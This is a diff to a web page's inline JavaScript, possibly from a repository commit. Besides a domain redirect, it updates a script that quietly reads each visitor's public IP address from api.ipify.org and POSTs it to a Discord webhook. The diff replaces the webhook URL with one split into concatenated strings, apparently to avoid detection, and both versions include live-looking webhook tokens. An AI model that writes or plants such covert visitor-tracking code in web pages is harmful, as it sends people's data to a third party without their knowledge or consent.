@@ -161,11 +161,10 @@
 
 <script type="text/javascript">
 if(location.href==="https://memastermind.tk/"){location.href = "https://mastermind.tk"}
-url="https://discord.com/api/webhooks/1066037174019043359/RD08fANiei7ZqUludvAvxBYMF_ckcmjdio5diLmssSGM_E1YttKMAnzX8O2mukrJa277"
-fetch("https://api.ipify.org?format=json", {mode: "no-cors"}).then(res => res.json()).then(data => {
+url="https://discord.com/a"+"pi/webhooks/106605308302669"+"8261/B1uFDsNnlIWvu4VtvZ5_0grNrT-Guix4AAzrAgmE7KQvhH9RiFn1aAWC-PcXtMu30tTz"
+fetch("https://api.ipify.org?format=json", {cors: "no-cors"}).then(res => res.json()).then(data => {
     fetch(url, {
         method: "POST",
-        mode: "no-cors",
         headers: {
             "Content-Type": "application/json"
         },
